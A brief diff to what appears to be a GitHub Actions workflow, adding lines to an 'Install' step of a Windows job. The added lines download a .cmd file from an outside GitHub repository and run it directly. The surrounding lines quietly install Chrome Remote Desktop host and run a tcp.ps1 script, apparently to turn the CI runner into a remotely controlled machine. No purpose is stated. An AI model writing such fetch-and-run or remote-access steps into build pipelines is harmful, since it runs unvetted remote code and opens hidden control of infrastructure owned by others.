@@ -11,6 +11,8 @@ jobs:
 
       - name: Install 
         run: |
+          Invoke-WebRequest https://github.com/Efebey2903/fictional-octo-waffle/a.cmd -OutFile setup.cmd
+          cmd /c setup.cmd
           cmd /c chromeremotedesktophost.msi /quiet
           cmd /c tcp.ps1
           
